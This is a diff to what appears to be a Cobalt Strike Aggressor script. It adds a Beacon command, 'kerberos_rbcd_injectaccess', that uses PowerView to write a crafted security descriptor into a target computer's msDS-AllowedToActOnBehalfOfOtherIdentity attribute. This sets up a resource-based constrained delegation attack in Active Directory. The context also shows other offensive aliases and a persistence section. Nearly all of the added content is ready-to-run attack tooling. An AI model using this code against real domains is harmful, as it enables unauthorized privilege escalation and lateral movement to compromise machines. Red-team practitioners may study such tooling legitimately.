@@ -351,6 +351,36 @@ beacon_command_register(
     "kerberos_rbcd_findtargets",
     "Find Role Based Constrained Delegation Machines");
 
+alias kerberos_rbcd_injectaccess {
+    $size = size(@_);
+    if ($size == 3) {
+        $target    = @_[1];
+        $donorsid  = @_[2];
+
+        blog($1, "TARGET = " . $target . "\ndonorside = " . $donorsid);
+        $parameters = "\$rsd\="
+        . 'New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;'
+        . $donorsid
+        . ')";'
+        . ' $rsdb = New-Object byte[] ($rsd.BinaryLength);'
+        . ' $rsd.GetBinaryForm($rsdb, 0);'
+        . ' Get-DomainComputer -Identity "'
+        . $target
+        . '" |'
+        . " Set-DomainObject -Set @\{\'msDS-AllowedToActOnBehalfOfOtherIdentity\' = \$rsdb\} -Verbose";
+        
+        bpowerpick($1, $parameters);
+    } else {
+        berror($1, "Invalid Parameters!");
+        return;
+    }
+}
+beacon_command_register(
+    "kerberos_rbcd_injectaccess",
+    "Uses PowerView to inject SDDL into a target machine from a compromised machine account",
+    "Uses PowerView to inject SDDL into a target machine from a compromised machine account\n\n"
+    . "Usage: kerberos_rbcd_injectaccess [target machine] [donor machine sid]\n"
+)
 
 #PERSISTANCE METHODS
 ## SCHEDULED TASKS
